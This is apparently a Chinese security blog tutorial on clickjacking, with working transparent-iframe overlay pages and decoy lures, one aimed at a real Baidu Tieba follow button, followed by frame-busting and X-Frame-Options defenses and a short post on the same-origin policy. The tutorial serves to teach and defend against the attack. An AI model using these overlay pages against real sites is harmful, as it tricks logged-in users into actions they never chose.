<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;<span class="xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">    &lt;style&gt;</span></span><br><span class="line"><span class="regexp">        #click&#123;</span></span><br><span class="line"><span class="regexp">            width: 100px;</span></span><br><span class="line"><span class="regexp">            top: 20px;</span></span><br><span class="line"><span class="regexp">            left: 20px;</span></span><br><span class="line"><span class="regexp">            position: absolute;</span></span><br><span class="line"><span class="regexp">        z-index: 1</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">        #hidden&#123;</span></span><br><span class="line"><span class="regexp">            height: 50px;</span></span><br><span class="line"><span class="regexp">            width: 120px;</span></span><br><span class="line"><span class="regexp">            position: absolute;</span></span><br><span class="line"><span class="regexp">            filter: alpha(opacity=50);</span></span><br><span class="line"><span class="regexp">        opacity: 0;</span></span><br><span class="line"><span class="regexp">        z-index: 2</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>style&gt;</span><br><span class="line">    &lt;input id=<span class="string">"click"</span> value=<span class="string">"Click me"</span> type=<span class="string">"button"</span>/&gt;</span><br><span class="line">    &lt;iframe id=<span class="string">"hidden"</span> src=<span class="string">"inner.html"</span> scrolling=<span class="string">"no"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
<p>inner.html</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;<span class="xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">    &lt;input style="width: 100px;" value="Login" type="button" onclick="alert('clickjacking_test')"/</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
<p>效果如下</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572083527.72.png" alt></p>
<p>说明：</p>
<p>clickjacking.html是一个用户可见的伪装页面，在其页面中设置iframe所在层为透明层，并在iframe中嵌套了inner.html页面。在clickjacking.html页面中设计了Click me,inner.html中的”login”按钮与其重合，所以在用户点击Click me时实际上点击的是login按钮。</p>
<h3 id="点击劫持实战"><a href="#点击劫持实战" class="headerlink" title="点击劫持实战"></a>点击劫持实战</h3><p>利用点击劫持诱导用户关注贴吧(在百度账户登录的情况下；目标<code>http://tieba.baidu.com/f?kw=%C3%C0%C5%AE</code></p>
<p>抓包测试HTTP响应头是否有 X-Frame-Options字段</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146338.05.png" alt></p>
<p>构造透明层iframe</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">     html,body,iframe&#123;</span></span><br><span class="line"><span class="regexp">         display: block;</span></span><br><span class="line"><span class="regexp">          height: 100%;</span></span><br><span class="line"><span class="regexp">          width: 100%;</span></span><br><span class="line"><span class="regexp">          margin: 0;</span></span><br><span class="line"><span class="regexp">          padding: 0;</span></span><br><span class="line"><span class="regexp">          border:none;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     iframe&#123;</span></span><br><span class="line"><span class="regexp">          opacity:0;</span></span><br><span class="line"><span class="regexp">          filter:alpha(opacity=0);</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          z-index:2;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     button&#123;</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          top: 355px;</span></span><br><span class="line"><span class="regexp">          left: 547px;</span></span><br><span class="line"><span class="regexp">          z-index: 1;</span></span><br><span class="line"><span class="regexp">          width: 72px;</span></span><br><span class="line"><span class="regexp">          height: 26px;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">     &lt;body&gt;</span></span><br><span class="line"><span class="regexp">          那些不能说的秘密</span></span><br><span class="line"><span class="regexp">          &lt;button&gt;查看详情&lt;/</span>button&gt;</span><br><span class="line">          &lt;iframe src=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">     &lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146436.41.png" alt></p>
<p>修改opacity值为0.3查看覆盖效果</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146499.35.png" alt></p>
<p>可以看到刚好覆盖在关注按钮上，只有用户登录了百度账户，诱导用户点击即可劫持鼠标点击关注</p>
<p>一般这种界面不容易诱导用户，所以要构造好诱导页面；在iframe中加载目标站点时，除了点击劫持还可以进行图片覆盖，有些图片的本来就可以诱导用户，当然也可以点击劫持加图片覆盖结合使用</p>
<p><strong>示例</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;</span><br><span class="line">&lt;img src=<span class="string">"sonarqube-black-256px.png"</span> style=<span class="string">"position:absolute;top:90px;left:320px;"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure>
<p>结合刚才的实例一起加载</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">     html,body,iframe&#123;</span></span><br><span class="line"><span class="regexp">         display: block;</span></span><br><span class="line"><span class="regexp">          height: 100%;</span></span><br><span class="line"><span class="regexp">          width: 100%;</span></span><br><span class="line"><span class="regexp">          margin: 0;</span></span><br><span class="line"><span class="regexp">          padding: 0;</span></span><br><span class="line"><span class="regexp">          border:none;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     iframe&#123;</span></span><br><span class="line"><span class="regexp">          opacity:0.3;</span></span><br><span class="line"><span class="regexp">          filter:alpha(opacity=0);</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          z-index:2;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     button&#123;</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          top: 355px;</span></span><br><span class="line"><span class="regexp">          left: 547px;</span></span><br><span class="line"><span class="regexp">          z-index: 1;</span></span><br><span class="line"><span class="regexp">          width: 72px;</span></span><br><span class="line"><span class="regexp">          height: 26px;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">     &lt;body&gt;</span></span><br><span class="line"><span class="regexp">          那些不能说的秘密</span></span><br><span class="line"><span class="regexp">          &lt;button&gt;查看详情&lt;/</span>button&gt;</span><br><span class="line">          &lt;iframe src=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">          &lt;a href=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;</span><br><span class="line">     &lt;img src=<span class="string">"sonarqube-black-256px.png"</span> style=<span class="string">"position:absolute;top:90px;left:320px;"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">     &lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146911.11.png" alt></p>
<h3 id="点击劫持实例-防御对比"><a href="#点击劫持实例-防御对比" class="headerlink" title="点击劫持实例+防御对比"></a>点击劫持实例+防御对比</h3><h4 id="情景一：无任何防御"><a href="#情景一：无任何防御" class="headerlink" title="情景一：无任何防御"></a>情景一：无任何防御</h4><p>目标页面代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;后台管理员添加&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">  &lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  h2&#123; color:blue;text-align: center;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">  &lt;h2&gt;管理员添加&lt;/</span>h2&gt;</span><br><span class="line">  &lt;div style=<span class="string">"text-align:center;"</span>&gt;</span><br><span class="line">    &lt;form action=<span class="string">"x.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">"username"</span> name=<span class="string">"username"</span>&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type="password" name="password"&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type="submit" name="submit" value="提交"&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>效果：模拟的登录界面</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182354.51.png" alt></p>
<p>构造透明层iframe</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  iframe&#123; position: absolute;z-index: 2;top: 0px;left: 0px;width: 1800px;height: 900px;opacity: 0;filter: alpha(opacity=0);&#125;</span></span><br><span class="line"><span class="regexp">  button&#123; position: absolute;z-index: 1;top: 140px;left: 881px;&#125;</span></span><br><span class="line"><span class="regexp">  input&#123; position: absolute;z-index: 1;top: 80px;left: 821px;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body background="mv.jpg" &gt;</span></span><br><span class="line"><span class="regexp">  &lt;div style="position: absolute;z-index: 1; top: -3px;left: 800px"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;h2&gt;靓丽美女账号注册&lt;/</span>h2&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;div style="position: absolute;z-index: 1;top: 43px;left: -1px;"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">  &lt;button&gt;注册&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">  &lt;iframe src="./</span>admin.html<span class="string">"&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>效果：诱导注册<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182435.88.png" alt></p>
<p>后台处理：实际场景中是模拟登录，此处为了方便，弹框即可</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isset($_POST[<span class="string">'username'</span>]) &amp;&amp; isset($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        echo <span class="string">"&lt;script&gt;alert('接收成功')&lt;/script&gt;"</span>;</span><br><span class="line">        echo <span class="string">"&lt;script&gt;alert('hacked by demos')&lt;/script&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">"&lt;script&gt;alert('数据不完整')&lt;/script&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>诱导点击效果：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182583.03.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182595.7.png" alt></p>
<h4 id="情景二：界面使用JavaScript动态防御"><a href="#情景二：界面使用JavaScript动态防御" class="headerlink" title="情景二：界面使用JavaScript动态防御"></a>情景二：界面使用JavaScript动态防御</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">if</span>(self == top)    <span class="comment">//在应用iframe时top指的是顶级的窗口</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">var</span> theBody = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>];</span><br><span class="line">      theBody.style.display = <span class="string">"block"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      top.location = self.location;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>在网站页面开发加上如上代码，可以动态防御iframe嵌入页面，在检测到有iframe嵌入当前页面时，直接跳转到当前页面，从而防御点击劫持。</p>
<p>本例实现代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;后台管理员添加&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">  &lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  h2&#123; color:blue;text-align: center;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">  &lt;h2&gt;管理员添加&lt;/</span>h2&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    <span class="keyword">if</span>(self == top)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">var</span> theBody = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>];</span><br><span class="line">      theBody.style.display = <span class="string">"block"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      top.location = self.location;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">  &lt;div style="text-align:center;"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;form action="x.php" method="POST"&gt;</span></span><br><span class="line"><span class="regexp">      &lt;input type="username" name="username"&gt;&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="regexp">      &lt;input type="password" name="password"&gt;&lt;br&gt;</span></span><br><span class="line"><span class="regexp">      &lt;input type="submit" name="submit" value="提交"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
<p>iframe嵌入访问的效果如下：当攻击者诱导用户访问恶意界面时，立即跳转到真正的页面，进行防御</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182966.45.png" alt></p>
<h4 id="情景三：添加X-Frame-Options头"><a href="#情景三：添加X-Frame-Options头" class="headerlink" title="情景三：添加X-Frame-Options头"></a>情景三：添加X-Frame-Options头</h4><blockquote>
<p> 使用该头后禁止页面被iframe嵌套 ,chrome有点问题，不知道为什么，emmm</p>
</blockquote>
<p>修改代码如下</p>
<p>admin.php:禁止一切源嵌入当前页面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"X-FRAME-OPTIONS:DENY"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;后台管理员添加&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">  body&#123; background-repeat: no-repeat;background-size: <span class="number">100</span>% <span class="number">100</span>%;background-attachment: fixed;&#125;</span><br><span class="line">  h2&#123; color:blue;text-align: center;&#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h2&gt;管理员添加&lt;/h2&gt;</span><br><span class="line">  &lt;div style=<span class="string">"text-align:center;"</span>&gt;</span><br><span class="line">    &lt;form action=<span class="string">"x.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">"username"</span> name=<span class="string">"username"</span>&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>攻击者构造的恶意页面</p>
<p>jack.html：opacity改为0.3查看是否嵌套成功</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  iframe&#123; position: absolute;z-index: 2;top: 0px;left: 0px;width: 1800px;height: 900px;opacity: 0.3;filter: alpha(opacity=0);&#125;</span></span><br><span class="line"><span class="regexp">  button&#123; position: absolute;z-index: 1;top: 140px;left: 881px;&#125;</span></span><br><span class="line"><span class="regexp">  input&#123; position: absolute;z-index: 1;top: 80px;left: 821px;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body background="mv.jpg" &gt;</span></span><br><span class="line"><span class="regexp">  &lt;div style="position: absolute;z-index: 1; top: -3px;left: 800px"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;h2&gt;靓丽美女账号注册&lt;/</span>h2&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;div style="position: absolute;z-index: 1;top: 43px;left: -1px;"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">  &lt;button&gt;注册&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">  &lt;iframe src="http:/</span><span class="regexp">/192.168.1.102/</span>clickhack/test2_2/admin.php<span class="string">"&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>效果如下：攻击者没有嵌套成功</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183292.84.png" alt></p>
<p>访问页面抓取数据包查看</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183394.57.png" alt></p>
<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><blockquote>
<p>最简单的方法：查看目标页面是否可以被iframe嵌套，利用pocbox做演示和上面实例做演示</p>
</blockquote>
<h4 id="情景一：无任何防御-1"><a href="#情景一：无任何防御-1" class="headerlink" title="情景一：无任何防御"></a>情景一：无任何防御</h4><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183600.0.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183636.5.png" alt></p>
<h4 id="情景二：界面使用JavaScript动态防御-1"><a href="#情景二：界面使用JavaScript动态防御-1" class="headerlink" title="情景二：界面使用JavaScript动态防御"></a>情景二：界面使用JavaScript动态防御</h4><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183712.82.png" alt></p>
<h4 id="情景三：添加X-Frame-Options头-1"><a href="#情景三：添加X-Frame-Options头-1" class="headerlink" title="情景三：添加X-Frame-Options头"></a>情景三：添加X-Frame-Options头</h4><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183798.76.png" alt></p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>使用JavaScript动态防御</p>
<p>使用一个HTTP头——X-Frame-Options。X-Frame-Options可以说是为了解决ClickJacking而生的，它有三个可选的值：</p>
<p>DENY：浏览器会拒绝当前页面加载任何frame页面；</p>
<p>SAMEORIGIN：frame页面的地址只能为同源域名下的页面；</p>
<p>ALLOW-FROM origin：允许frame加载的页面地址；</p>
<p>PS：浏览器支持情况：IE8+、Opera10+、Safari4+、Chrome4.1.249.1042+、Firefox3.6.9。</p>
<p>具体的设置方法：</p>
<p><strong>Apache配置：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Header always append X-Frame-Options SAMEORIGIN</span><br></pre></td></tr></table></figure>
<p><strong>nginx配置：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">add_header X-Frame-Options SAMEORIGIN;</span><br></pre></td></tr></table></figure>
<p><strong>IIS配置：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;system.webServer&gt;</span><br><span class="line">    ...</span><br><span class="line">    &lt;httpProtocol&gt;</span><br><span class="line">        &lt;customHeaders&gt;</span><br><span class="line">            &lt;add name=<span class="string">"X-Frame-Options"</span> value=<span class="string">"SAMEORIGIN"</span> /&gt;</span><br><span class="line">        &lt;<span class="regexp">/customHeaders&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>httpProtocol&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;<span class="regexp">/system.webServer&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>界面操作劫持漏洞挖掘只需要确认：目标的HTTP响应头是否设置好了X-Frame-Options字段；目标是否又JavaScript的Frame Busting机制；更简单的是用iframe嵌入目标站点试试，如果成功，则证明漏洞存在。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>web前端黑客技术揭秘</p>
<p><a href="https://www.cnblogs.com/lovesong/p/5248483.html" target="_blank" rel="noopener">https://www.cnblogs.com/lovesong/p/5248483.html</a></p>
<p><a href="https://www.cnblogs.com/haq5201314/p/8992273.html" target="_blank" rel="noopener">https://www.cnblogs.com/haq5201314/p/8992273.html</a></p>
]]></content>
      <categories>
        <category>web前端相关</category>
      </categories>
      <tags>
        <tag>界面劫持</tag>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title>同源策略</title>
    <url>/2018/10/27/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><blockquote>
<p>浏览器的同源策略限制从一个源加载的文档或脚本如何域来自另一个源的资源进行交互。同源策略是浏览器的安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。只有同一个源的脚本赋予dom、读写cookie、session、Ajax等操作的权限。URL由协议、域名、端口、路径组成。简单来说就是两个URL的协议、域名、端口相同，则就是同源的；特殊情况、IE没有对端口做同源策略的限制、只验证了协议和域名。</p>
</blockquote>
<p>例如该地址 <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a> 和以下地址对比</p>
<p>地址    同源    原因<br><a href="http://www.google.com" target="_blank" rel="noopener">http://www.google.com</a>                         否    协议不一致<br><a href="https://google.com" target="_blank" rel="noopener">https://google.com</a>                                   否    域名不一致<br><a href="https://www.google.com:81" target="_blank" rel="noopener">https://www.google.com:81</a>                 否    端口号不一致<br><a href="https://www.google.com/a/s.html" target="_blank" rel="noopener">https://www.google.com/a/s.html</a>    是    协议，域名和端口号都一致</p>
<h2 id="同源策略的限制"><a href="#同源策略的限制" class="headerlink" title="同源策略的限制"></a>同源策略的限制</h2><ul>
<li><p>存储在浏览器中的数据，如localStroage、Cooke和IndexedDB、cookie等不能通过脚本跨域访</p>
</li>
<li><p>不能通过脚本操作不同域下的DOM</p>
</li>
<li><p>不能通过ajax请求不同域的数据</p>
</li>
</ul>
<h2 id="可能的跨域资源嵌入实例"><a href="#可能的跨域资源嵌入实例" class="headerlink" title="可能的跨域资源嵌入实例"></a>可能的跨域资源嵌入实例</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">""</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">""</span>/&gt;标签嵌入css。由于css的松散的语法规则，css的跨域需要一个正确的content-type消息头。不用的浏览器有不同的限制。</span><br><span class="line">&lt;img&gt;嵌入图片</span><br><span class="line">&lt;video&gt;和&lt;audio&gt;嵌入多媒体资源</span><br><span class="line">&lt;object&gt;，&lt;embed&gt;和&lt;applet&gt;的插件</span><br><span class="line">@font-face引入的字体。一些浏览器允许跨域字体(cross-origin fonts),一些需要同源字体</span><br><span class="line">&lt;frame&gt;和&lt;iframe&gt;载入的任何资源。站点可以使用x-Frame-Options消息头来阻止这种形式的跨域交互</span><br></pre></td></tr></table></figure>
